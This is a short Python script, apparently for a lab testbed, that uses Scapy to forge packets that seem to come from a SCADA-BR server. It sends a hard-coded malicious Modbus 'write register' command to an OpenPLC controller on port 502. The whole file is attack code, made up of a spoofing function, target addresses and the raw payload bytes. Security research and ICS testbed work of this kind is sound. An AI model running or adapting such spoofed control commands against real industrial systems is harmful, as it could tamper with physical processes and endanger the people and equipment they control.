from scapy.all import *
import sys

def ip_spoofing_attack(scada_ip, plc_ip, plc_port, malicious_command):
    """
    Simulates an IP spoofing attack by sending a malicious packet to the PLC.
    
    :param scada_ip: IP address of SCADA-BR (to be spoofed).
    :param plc_ip: IP address of OpenPLC.
    :param plc_port: Port on which OpenPLC is listening.
    :param malicious_command: Payload containing the malicious command.
    """
    # Craft the IP and TCP layers
    ip_layer = IP(src=scada_ip, dst=plc_ip)  # Spoof the source IP
    tcp_layer = TCP(dport=plc_port)          # Destination port (OpenPLC)
    
    # Craft the payload (e.g., a Modbus TCP command)
    payload = Raw(load=malicious_command)
    
    # Combine the layers into a packet
    spoofed_packet = ip_layer / tcp_layer / payload
    
    # Send the packet
    send(spoofed_packet, verbose=False)
    print(f"[+] Sent spoofed packet from {scada_ip} to {plc_ip}:{plc_port}")

if __name__ == "__main__":
    # Define the IP addresses and port
    scada_ip = "172.18.0.11"  # IP address of SCADA-BR (to be spoofed)
    plc_ip = "172.18.0.9"    # IP address of OpenPLC
    plc_port = 502              # Modbus TCP port (default for OpenPLC)
    
    # Define a malicious Modbus TCP command (example: write to a register)
    malicious_command = b"\x00\x01\x00\x00\x00\x06\x01\x06\x00\x01\x00\x02"  # Example Modbus command
    
    # Perform the IP spoofing attack
    ip_spoofing_attack(scada_ip, plc_ip, plc_port, malicious_command)